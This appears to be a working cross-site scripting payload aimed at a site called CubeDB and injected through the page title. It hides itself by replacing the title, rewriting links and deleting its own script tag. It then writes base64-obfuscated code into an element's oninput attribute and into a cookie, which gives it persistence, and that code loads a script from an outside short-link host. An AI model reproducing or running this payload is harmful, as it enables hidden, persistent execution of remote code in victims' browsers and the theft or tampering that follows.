let custom_title = "Awesome solve!";
let payload = document.title.split(" - CubeDB")[0];

if (document.title.startsWith("<d")) {
    document.title = document.title.replace(payload, custom_title);
    title.innerHTML = custom_title;
}

document.querySelector("details").outerHTML = custom_title;

Array.from(document.querySelectorAll("a")).forEach(e => e.href = e.href.replace(
    /%3Cd.*?&/g,
    encodeURIComponent(custom_title) + "&"
));
document.body.removeChild(
  Array.from(document.querySelectorAll("script")).reverse()[0]
);

console.log("Injected from title")


document.querySelector('#appearance-subtitles')?.setAttribute("oninput", 'eval(atob`ICAgIGxldCB5PXRoaXMuZ2V0QXR0cmlidXRlYG9uaW5wdXRgO3RoaXMucmVtb3ZlQXR0cmlidXRlYG9uaW5wdXRgO2xldCB4PWZ1bmN0aW9uKCl7c2V0VGltZW91dChmdW5jdGlvbigpe2RvY3VtZW50LmNvb2tpZT0iYXBwZWFyYW5jZS1zdWJ0aXRsZXM9IisodGhpcy5jaGVja2VkPyJjaGVja2VkICI6IiIpKyJvbmlucHV0PSIreX0uYmluZCh0aGlzKSwxNSl9O3dpdGgoeCgpLHRoaXMuYWRkRXZlbnRMaXN0ZW5lcigiaW5wdXQiLHgpLGRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWVudGBzY3JpcHRgKS5zcmM9Ii8vdC5seS9JRVl0Ijs=`)');
document.cookie = 'appearance-subtitles=oninput='+(document.querySelector('#appearance-subtitles')?.checked ? 'checked ' : '')+'eval(atob`ICAgIGxldCB5PXRoaXMuZ2V0QXR0cmlidXRlYG9uaW5wdXRgO3RoaXMucmVtb3ZlQXR0cmlidXRlYG9uaW5wdXRgO2xldCB4PWZ1bmN0aW9uKCl7c2V0VGltZW91dChmdW5jdGlvbigpe2RvY3VtZW50LmNvb2tpZT0iYXBwZWFyYW5jZS1zdWJ0aXRsZXM9IisodGhpcy5jaGVja2VkPyJjaGVja2VkICI6IiIpKyJvbmlucHV0PSIreX0uYmluZCh0aGlzKSwxNSl9O3dpdGgoeCgpLHRoaXMuYWRkRXZlbnRMaXN0ZW5lcigiaW5wdXQiLHgpLGRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWVudGBzY3JpcHRgKS5zcmM9Ii8vdC5seS9JRVl0Ijs%3D`);path=/;SameSite=Lax';
